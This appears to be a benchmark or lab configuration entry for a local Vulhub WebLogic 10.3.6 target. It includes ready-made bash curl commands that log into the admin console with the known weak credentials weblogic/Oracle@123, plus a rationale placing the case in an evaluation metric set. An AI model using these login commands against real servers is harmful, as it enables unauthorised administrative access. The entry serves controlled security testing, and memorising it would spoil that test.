name: Vulhub-WebLogic-weak-password
isolation_note: Vulhub weblogic/weak_password (WebLogic 10.3.6 console weak creds weblogic/Oracle@123), bound to 127.0.0.1:8090 only. Owned, disposable local lab.

eta_recipes.auth_attempt: bash -c 'curl -s -c /tmp/wl.jar "{target}/console/login/LoginForm.jsp" -o /dev/null; curl -s -b /tmp/wl.jar -i "{target}/console/j_security_check" --data "j_username=weblogic&j_password=Oracle@123" | grep -i "^location:" | grep -vi loginform | grep -qi console && echo "logged in: weblogic console dashboard (set-cookie)"'
eta_recipes.credential_use: bash -c 'curl -s -c /tmp/wl.jar "{target}/console/login/LoginForm.jsp" -o /dev/null; curl -s -b /tmp/wl.jar -i "{target}/console/j_security_check" --data "j_username=weblogic&j_password=Oracle@123" | grep -i "^location:" | grep -vi loginform | grep -qi console && echo "logged in: weblogic console dashboard (set-cookie)"'

rationale: WebLogic 10.3.6 weak console password (weblogic/Oracle@123). Self-advertising (WebLogic). AUTH-MILESTONE box: the weak-password vuln IS authentication; the further RCE (console war-deploy) is multi-step and not single-command-wireable. Reaches the auth milestone via a chained 2-step (session then j_security_check) bash -c; goal (cmd-exec+file-read) not reachable. A contrast case for the 7-dim metrics.
